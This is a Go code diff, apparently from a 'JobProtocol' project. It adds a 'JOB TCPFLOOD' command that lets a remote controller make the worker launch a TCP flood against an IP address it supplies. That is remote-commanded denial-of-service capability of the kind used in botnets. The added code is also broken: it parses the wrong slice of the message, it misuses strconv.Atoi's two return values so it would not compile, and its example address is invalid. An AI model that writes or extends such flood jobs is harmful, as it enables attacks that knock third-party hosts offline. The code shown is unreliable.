@@ -5,11 +5,13 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 
 	"github.com/Knetic/govaluate"
 
 	globals "github.com/prairir/JobProtocol/Globals"
+	jobs "github.com/prairir/JobProtocol/Jobs"
 )
 
 func main() {
@@ -43,6 +45,10 @@ func main() {
 			conn.Write([]byte("ACPT JOB EQN\r\n"))
 			fmt.Println("received:", result)
 			state = 3
+		} else if state == 2 && cleanedResult == "JOB TCPFLOOD" {
+			conn.Write([]byte("ACPT JOB TCPFLOOD\r\n"))
+			fmt.Println("received:", result)
+			state = 3
 		} else if state == 3 && cleanedResult[:7] == "JOB EQN" {
 			fmt.Println("[", cleanedResult[8:], "]")
 			expression, err := govaluate.NewEvaluableExpression(cleanedResult[8:])
@@ -59,6 +65,15 @@ func main() {
 			} else {
 				conn.Write([]byte("JOB SUCC " + fmt.Sprint(expResult) + "\r\n"))
 			}
+			state = 4
+		} else if state == 3 && cleanedResult[:12] == "JOB TCPFLOOD" {
+			// splits after JOB TCPFLOOD
+			// eg JOBTCPFLOOD 123.321.543.345 14 -> ["123.321.543.345", "14"]
+			splits := strings.Split(cleanedResult[:13], " ")
+
+			jobs.TCPFlood(splits[0], strconv.Atoi(splits[1]))
+
+			conn.Write([]byte("JOB SUCC \r\n"))
 			state = 4
 		}
 		if state == 4 {
